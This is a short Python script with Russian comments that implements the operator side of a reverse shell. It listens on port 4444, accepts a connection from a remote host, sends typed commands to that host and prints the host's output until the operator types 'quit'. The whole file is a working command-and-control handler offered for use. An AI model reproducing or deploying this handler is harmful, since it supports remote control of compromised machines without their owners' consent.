#Добавление необходимых библеотек
import os
import sys
import socket

#Создание серверного сокета для подключения
def socket_create():

    #Попытка создания глобальных переменных и самого сокета
    try:
        global host
        global port
        global s

        host = ""
        #Можно поменять
        port = 4444
        s = socket.socket()

    #При появлении ошибки выводится информация о ней
    except socket.error as msg:
        print(f"\033[30m[-]\033[0m Error: {str(msg)}")

#Назначение сокета и прослушивание порта
def socket_bind():
    try:
        global host
        global port
        global s

        print(f"\033[34m[*]\033[0m Info: Binding on {host} to port {str(port)}")

        s.bind((host, port))
        s.listen(5)

    #Повтор функции при неудаче
    except socket.error as msg:
        print(f"\033[30m[-]\033[0m Error: {str(msg)}Trying again")
        socket_bind()

#Подтверждение подключения
def socket_accept():

    conn, address = s.accept()
    print(f"\033[32m[+]\033[0m Successful: Socket accepted {host}:{str(port)}")

    #Запуск функции для отправки команд удалённому хосту
    send_commands(conn)
    conn.close()


#Функция для отправки команд удалённому хосту
def send_commands(conn):
    #Создание цикла для ввода
    while True:
        cmd = input()

        #Проверка на команду quit для выхода из программы
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()

        #Отправка команд удалённому хосту
        elif len(str.encode(cmd)) > 0:
            #Отправка команды
            conn.send(str.encode(cmd))
            #Получение вывода от удалённого хоста
            client_response = str(conn.recv(4096), "utf-8")
            print(client_response, end="")

#Главная функция запускающая последовательно предыдущие функции
def main():
    socket_create()
    socket_bind()
    socket_accept()

#Запуск главной функции
main()
